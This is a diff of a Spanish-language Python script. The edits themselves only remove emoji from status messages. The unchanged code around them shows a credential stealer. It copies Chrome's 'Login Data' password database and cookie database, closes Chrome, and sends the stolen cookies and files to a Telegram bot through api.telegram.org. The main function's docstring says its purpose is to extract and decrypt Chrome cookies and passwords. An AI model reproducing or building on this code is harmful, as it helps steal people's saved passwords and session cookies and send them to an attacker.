@@ -254,19 +254,19 @@ def copiar_archivos_chrome():
     try:
         if os.path.exists(password_db_path):
             shutil.copy2(password_db_path, password_dest)
-            print(f"✅ Login Data copiado a: {password_dest}")
+            print(f"Login Data copiado a: {password_dest}")
         else:
-            print(f"❌ Login Data no encontrado en: {password_db_path}")
+            print(f"Login Data no encontrado en: {password_db_path}")
             
         if os.path.exists(cookie_db_path):
             shutil.copy2(cookie_db_path, cookie_dest)
-            print(f"✅ Cookie copiado a: {cookie_dest}")
+            print(f"Cookie copiado a: {cookie_dest}")
         else:
-            print(f"❌ Cookie no encontrado en: {cookie_db_path}")
+            print(f"Cookie no encontrado en: {cookie_db_path}")
 
         
     except Exception as e:
-        print(f"⚠️ Error durante la copia: {e}")
+        print(f"Error durante la copia: {e}")
 
 
 def close_chrome():
@@ -302,11 +302,11 @@ def enviar_a_telegram(mensaje):
     try:
         response = requests.post(url, data=payload)
         if response.status_code == 200:
-            print("✅ Cookies enviadas a Telegram.")
+            print("Cookies enviadas a Telegram.")
         else:
-            print(f"⚠️ Error al enviar mensaje: {response.text}")
+            print(f"Error al enviar mensaje: {response.text}")
     except Exception as e:
-        print(f"❌ Excepción al enviar a Telegram: {e}")
+        print(f"Excepción al enviar a Telegram: {e}")
 
 def enviar_archivo_telegram(ruta_archivo, mensaje_caption=None):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
@@ -321,11 +321,11 @@ def enviar_archivo_telegram(ruta_archivo, mensaje_caption=None):
             }
             response = requests.post(url, data=data, files=files)
             if response.status_code == 200:
-                print("✅ Archivo enviado correctamente.")
+                print("Archivo enviado correctamente.")
             else:
-                print(f"⚠️ Error al enviar archivo: {response.text}")
+                print(f"Error al enviar archivo: {response.text}")
     except Exception as e:
-        print(f"❌ Excepción al enviar archivo: {e}")
+        print(f"Excepción al enviar archivo: {e}")
         
 def main():
     """Función principal para extraer y descifrar cookies y contraseñas de Chrome."""
